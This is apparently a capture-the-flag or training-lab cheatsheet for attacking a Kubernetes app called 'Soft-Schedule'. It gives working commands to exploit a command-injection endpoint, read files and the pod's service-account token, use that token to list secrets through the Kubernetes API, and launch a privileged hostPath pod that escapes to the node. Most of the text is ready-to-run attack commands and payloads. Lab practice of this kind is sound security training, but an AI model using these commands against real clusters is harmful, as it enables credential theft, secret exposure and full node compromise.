# Cheatsheet — Soft-Schedule

## Targets

- **app01** — :80 NodePort → `shop-app` pod (`/exec?cmd=` RCE)

## Useful commands

```bash
# in-pod RCE
curl -s 'http://app01/exec?cmd=id'
curl -s 'http://app01/exec?cmd=cat+/etc/labflags/api-secret.txt'
curl -s 'http://app01/exec?cmd=cat+/var/run/secrets/kubernetes.io/serviceaccount/token'

# talk to the API with the SA token (url-encode the inner command)
curl -ks -H "Authorization: Bearer $TOK" \
  https://kubernetes.default.svc/api/v1/namespaces/prod/secrets

# privileged pod -> flag via pod log (POST body to the API)
{"apiVersion":"v1","kind":"Pod","metadata":{"name":"x","namespace":"prod"},
 "spec":{"serviceAccountName":"default","containers":[{"name":"x",
 "image":"pentrain/shop-app:latest","securityContext":{"privileged":true},
 "command":["sh","-c","cat /host/root/k8s-flag.txt; sleep 30"],
 "volumeMounts":[{"name":"h","mountPath":"/host"}]}],
 "volumes":[{"name":"h","hostPath":{"path":"/host"}}],
 "restartPolicy":"Never"}}
```

## Concepts

- SA tokens live in every pod by default; RBAC decides what they're worth.
- `pods create` + `pods/log get` = code execution on the cluster without a
  shell — a privileged `hostPath` pod turns that into node root.
- Kubernetes API answers plain HTTPS — curl + a stolen token is kubectl.
